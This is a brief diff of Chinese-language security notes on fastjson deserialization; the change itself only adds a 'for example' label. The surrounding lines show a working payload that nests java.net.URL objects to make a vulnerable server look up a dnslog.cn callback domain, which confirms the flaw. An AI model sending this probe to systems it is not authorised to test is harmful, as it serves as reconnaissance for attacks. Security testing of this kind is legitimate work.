@@ -237,7 +237,9 @@ Content-Length: 137
 
 java.net.URL 函数（实战成功）
 ```shell
+例如：
 {"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":""}}""},"b":{{"@type":"java.net.URL","val":"http://cij9t8.dnslog.cn"}:"x"},"c":{{"@type":"java.net.URL","val":"http://cij9t8.dnslog.cn"}:0,"d":Set[{"@type":"java.net.URL","val":"http://cij9t8.dnslog.cn"}],"e":Set[{"@type":"java.net.URL","val":"http://cij9t8.dnslog.cn"},}
+
 ```
 
 # 免责声明
